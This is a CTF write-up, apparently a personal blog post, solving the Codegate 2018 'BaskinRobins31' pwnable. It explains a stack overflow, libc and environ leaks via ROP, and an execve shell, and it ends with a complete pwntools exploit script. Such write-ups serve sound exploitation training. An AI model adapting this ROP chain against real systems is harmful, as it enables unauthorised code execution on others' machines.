+++
title = "Codegate CTF 2018 Qual - BaskinRobins31"
date = "2024-07-09"
description = "Codegate CTF 2018 Qual pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "bof", "rop"]
+++
## 0x00. Introduction
``` bash
[*] '/home/user/BaskinRobins31'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Concept
This challenge implements a reverse Baskin Robbins game where **you choose a number from 1 to 3 (important)**, subtract it from 31, and the person who calls the last number 0 loses.


## 0x01. Vulnerability
``` c
__int64 __fastcall your_turn(_DWORD *a1)
{
  ...
  char buf[160]; // [rsp+10h] [rbp-B0h] BYREF

  len = read(0, buf, 0x190uLL);
  ...
}
```
The vulnerability is simple: a buffer overflow occurs in `your_turn()` where I input data.


## 0x02. Exploit
``` python
    payload = b"1" + b"A" * 0xaf
    payload += b"B" * 8          # sfp
    payload += p64(bp['pppr'])
    payload += p64(1)
    payload += p64(elf.got['write'])
    payload += p64(8)
    payload += p64(elf.plt['write'])
    payload += p64(bp['main'])
    s.sendline(payload)

    s.recvn(len(payload) + 3)
    libc = u64(s.recv(1024)[0:6] + b"\x00\x00") - lib.symbols['write']
    system = libc + lib.symbols['execve']
    log.info(f"libc : {hex(libc)}")
    log.info(f"system : {hex(system)}")
```

Since BOF is possible, I performed a libc leak using ROP and successfully obtained the address of `execve`.
Initially, I proceeded with the exploit using the address of `system`, but a segmentation fault occurred, possibly due to stack alignment issues.
Switching to `execve` made it work.

The problem was how to pass `/bin/sh` to `execve`.
While I could find and pass it from libc, I solved this with a stack leak using `environ`.

``` python
    payload = b"2" + b"C" * 0xaf
    payload += b"D" * 8
    payload += p64(bp['pppr'])
    payload += p64(1)
    payload += p64(libc + lib.symbols['environ'])
    payload += p64(8)
    payload += p64(elf.plt['write'])
    payload += p64(bp['main'])
    s.sendline(payload)

    s.recvn(len(payload) + 3)
    environ = u64(s.recv(1024)[1:7] + b"\x00\x00")
    log.info(f"environ : {hex(environ)}")
    log.info(f"binsh : {hex(environ - 0x1d0)}")
```

This way, I retrieved the stack address stored in `environ`, calculated the offset difference with `buf+0x8`, placed the `/bin/sh` string at `buf+0x8`, and passed it as an argument to the `execve` function.

``` python
    payload = b"3" + b"E" * 7
    payload += b"/bin/sh\x00"                   # buf + 0x8
    payload += b"F" * (0xb0 - len(payload))
    payload += b"G" * 8
    payload += p64(bp['pppr'])
    payload += b"H" * 0x18
    payload += p64(bp['pppr'])
    payload += p64(environ - 0x1d0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(system)
    s.sendline(payload)

    s.interactive()
```

However, in the final payload, when reaching the `pppr` gadget, only the `rsi` value became strange and the shell kept failing to spawn.

``` bash
➜  0x40097a <your_turn+214>  ret
    ↳   0x40087a <helper+4>       pop    rdi
        0x40087b <helper+5>       pop    rsi
        0x40087c <helper+6>       pop    rdx
        0x40087d <helper+7>       ret
gef➤  x/4gx $rsp
0x7fffffffe188: 0x000000000040087a      0x00007fffffffe0d8
0x7fffffffe198: 0x00000000fffffffd      0x000000000000000
```

At first, I was confused and just solved it by calling the `pppr` gadget twice...

```
.text:000000000040095D  mov     rax, [rbp+var_B8]
.text:0000000000400964  mov     eax, [rax]
.text:0000000000400966  sub     eax, [rbp+choice]
```

It turned out that while playing the Baskin Robbins game, the value I entered was being decremented lol

So I thought, "Wait, why did it work fine before?" and checked...

``` c
write(1, write_got, 8 - 1);
write(1, write_got, 8 - 2);
```

In the previous ROP payload, the `size` argument of `write` was reduced by 1 and 2, but it was fine since the address doesn't use all 8 bytes anyway lol

I structured the dummy differently when writing the payload to identify which payload was being sent, but I didn't expect such a butterfly effect...


## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
import sys

DEBUG = True
BINARY = "BaskinRobins31"
LIBRARY = "libc.so.6"

bp = {
    'main' : 0x0000000000400a4b,
    'end_of_main' : 0x0000000000400b5a,
    'your_turn' : 0x00000000004008a4,
    'end_of_your_turn' : 0x000000000040097a,
    'pppr' : 0x40087a,                          # pop rdi; pop rsi; pop rdx
}

gs = f'''
b *{bp['end_of_your_turn']}
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def main():
    if(len(sys.argv) > 1):
        s = remote("0.0.0.0", int(sys.argv[1]))
    else:
        s = process(BINARY)
        if DEBUG:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)

    s.recv(1024)

    payload = b"1" + b"A" * 0xaf
    payload += b"B" * 8          # sfp
    payload += p64(bp['pppr'])
    payload += p64(1)
    payload += p64(elf.got['write'])
    payload += p64(8)
    payload += p64(elf.plt['write'])
    payload += p64(bp['main'])
    s.sendline(payload)

    s.recvn(len(payload) + 3)
    libc = u64(s.recv(1024)[0:6] + b"\x00\x00") - lib.symbols['write']
    system = libc + lib.symbols['execve']
    log.info(f"libc : {hex(libc)}")
    log.info(f"system : {hex(system)}")

    payload = b"2" + b"C" * 0xaf
    payload += b"D" * 8
    payload += p64(bp['pppr'])
    payload += p64(1)
    payload += p64(libc + lib.symbols['environ'])
    payload += p64(8)
    payload += p64(elf.plt['write'])
    payload += p64(bp['main'])
    s.sendline(payload)

    s.recvn(len(payload) + 3)
    environ = u64(s.recv(1024)[1:7] + b"\x00\x00")
    log.info(f"environ : {hex(environ)}")
    log.info(f"binsh : {hex(environ - 0x1d0)}")

    payload = b"3" + b"E" * 7
    payload += b"/bin/sh\x00"
    payload += b"F" * (0xb0 - len(payload))
    payload += b"G" * 8
    payload += p64(bp['pppr'])
    payload += b"H" * 0x18
    payload += p64(bp['pppr'])
    payload += p64(environ - 0x1d0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(system)
    s.sendline(payload)

    s.interactive()

if __name__=='__main__':
    main()
```